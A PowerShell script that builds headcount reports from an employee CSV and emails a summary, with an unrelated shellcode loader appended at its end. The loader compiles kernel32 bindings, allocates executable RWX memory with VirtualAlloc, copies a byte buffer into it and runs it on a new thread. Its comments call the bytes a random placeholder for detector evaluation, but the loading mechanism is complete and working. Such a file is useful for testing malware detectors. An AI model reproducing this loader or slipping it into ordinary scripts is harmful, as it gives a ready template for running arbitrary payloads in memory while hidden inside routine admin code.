[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$InputCsv = "D:\Incoming\employees.csv",

    [string]$OutputPath = "C:\Logs\reports\headcount-summary-2026-03-27.csv",
    [Parameter(Mandatory = $false)]
    [ValidateSet("Department", 'Site')]
    [string]$GroupBy = "Site",

    [double]$MinAmount = 5000
)
$ErrorActionPreference = "Stop"
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$culture = [System.Globalization.CultureInfo]::InvariantCulture
Set-StrictMode -Version 2.0

if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }

$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}

$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count

$byGroup | Sort-Object -Property Total -Descending | Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
$aboveThreshold = $byGroup | Where-Object { $_.Total -ge $MinAmount }
$aboveThreshold | Export-Csv -Path $OutputPath.Replace('.csv', '-filtered.csv') -NoTypeInformation -Encoding UTF8

$bySite = $rows | Group-Object -Property Site | ForEach-Object {
    [pscustomobject]@{
        Site      = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}
$bySite | Sort-Object -Property Total -Descending | Format-Table -AutoSize

$duplicates = $rows | Group-Object -Property EmployeeId |
    Where-Object { $_.Count -gt 1 } |
    Select-Object Name, Count
if (@($duplicates).Count -gt 0) {
    Write-Warning ("Duplicate employee ids: {0}" -f @($duplicates).Count)
}

$byManager = $rows | Group-Object -Property Manager |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byManager | Format-Table -AutoSize
$style = @'
<style>
body { font-family: Segoe UI; font-size: 13px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f0f0f0; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byGroup | Sort-Object -Property Total -Descending |
    ConvertTo-Html -Title 'Headcount summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.csv', '.html') -Encoding UTF8
$jsonBody = $byGroup | ConvertTo-Json -Depth 4
$jsonBody | Set-Content -Path $OutputPath.Replace('.csv', '.json') -Encoding UTF8
$bySite | Export-Csv -Path $OutputPath.Replace('.csv', '-by-site.csv') -NoTypeInformation -Encoding UTF8
$summaryBody = @"
Rows processed : $rowCount
Grand total    : $grandTotal
Groups         : $($byGroup.Count)
Output         : $OutputPath
"@

$MailTo = 'reporting@contoso.com'
$MailFrom = "bi@contoso.com"

Send-MailMessage `
    -To $MailTo `
    -From $MailFrom `
    -Subject "Headcount summary" `
    -Body $summaryBody `
    -SmtpServer 'smtp.contoso.com' `
    -Port 25 `
    -UseSsl

Write-Host ("Report written to {0}" -f $OutputPath) -ForegroundColor Green
Write-Verbose ("Filtered groups above threshold: {0}" -f @($aboveThreshold).Count)

$sample = $rows | Select-Object -First 3
$sample | Format-Table -AutoSize | Out-String | Write-Verbose

$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}

$average = ($rows | Measure-Object -Property Amount -Average).Average
Write-Verbose ("Average amount: {0:N2}" -f $average)

$culture = [System.Globalization.CultureInfo]::GetCultureInfo('en-US')
$formatted = $grandTotal.ToString('C2', $culture)
Write-Verbose ("Formatted total: {0}" -f $formatted)

$byCostCenter = $rows | Where-Object { $_.PSObject.Properties.Name -contains 'CostCenter' } |
    Group-Object -Property CostCenter | Sort-Object -Property Count -Descending | Select-Object -First 5
$byCostCenter | Format-Table Name, Count -AutoSize

$largest = $rows | Sort-Object -Property Amount -Descending | Select-Object -First 5
$largest | Format-Table Name, Department, Amount -AutoSize

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x7e, 0x48, 0x6a, 0x44, 0xd6, 0x49, 0x8e, 0x25, 0xe0, 0xc2, 0xb9, 0x13, 0x33, 0xd2, 0x3d, 0x64,
        0x4e, 0x96, 0x20, 0x4a, 0xb8, 0xf3, 0xfc, 0xb7, 0x22, 0x1e, 0x6b, 0x2c, 0x76, 0x25, 0x98, 0x86,
        0x1a, 0xf6, 0x25, 0x15, 0x3c, 0x2e, 0xfa, 0x5d, 0x8b, 0xb9, 0xf5, 0xd1, 0x11, 0x3a, 0x04, 0x12,
        0xf7, 0xfd, 0xe6, 0xcb, 0xfa, 0xfb, 0x76, 0x5a, 0xdf, 0x59, 0x3e, 0x47, 0xec, 0x08, 0x7f, 0x55,
        0x1d, 0xff, 0x51, 0x76, 0xad, 0x56, 0x74, 0x38, 0x45, 0x1f, 0x39, 0xc9, 0x4c, 0xb7, 0x97, 0x9b,
        0xd1, 0x75, 0x7f, 0x8d, 0x06, 0x87, 0x26, 0xce, 0x0c, 0x34, 0x74, 0xa1, 0xb5, 0x41, 0x31, 0x35,
        0xd5, 0xa5, 0xee, 0x1e, 0xc0, 0x33, 0x87, 0x27, 0x3d, 0xa0, 0xe9, 0x28, 0xf1, 0xa0, 0xc9, 0xdb,
        0xe1, 0xb3, 0x2a, 0x00, 0x07, 0x11, 0xcd, 0x6c, 0x96, 0x75, 0x57, 0xd6, 0x39, 0x88, 0xd5, 0xf2,
        0x75, 0x47, 0xb5, 0xf1, 0x8b, 0x67, 0x7c, 0xd6, 0x69, 0x72, 0x78, 0xe6, 0x3c, 0xd8, 0xe0, 0xcf,
        0xf8, 0xe6, 0x9b, 0x4a, 0x1f, 0x73, 0xc3, 0xcf, 0x53, 0x76, 0xde, 0xaa, 0x33, 0xe5, 0xaf, 0xf9,
        0x53, 0xcf, 0xf5, 0xde, 0x52, 0x84, 0x4f, 0xf8, 0x41, 0x2c, 0x04, 0x1d, 0x00, 0xce, 0xe0, 0x66,
        0x53, 0x25, 0xde, 0x02, 0xfd, 0xe1, 0xc2, 0x08, 0xbd, 0xd2, 0x88, 0x0d, 0x64, 0xec, 0x39, 0x77,
        0xb7, 0x7d, 0xaf, 0x3f, 0x25, 0xd6, 0x18, 0xc1, 0x7f, 0xcd, 0x7b, 0x7d, 0xd1, 0xbb, 0x2e, 0xe2,
        0xb4, 0x75, 0xcb, 0x1f, 0xdc, 0xbc, 0xdc, 0x90, 0x42, 0xc2, 0xe5, 0xa4, 0x2d, 0xbf
    )

    $HProcess = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($HProcess -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeApi]::WaitForSingleObject($Thread, 2391)
    [void][NativeApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
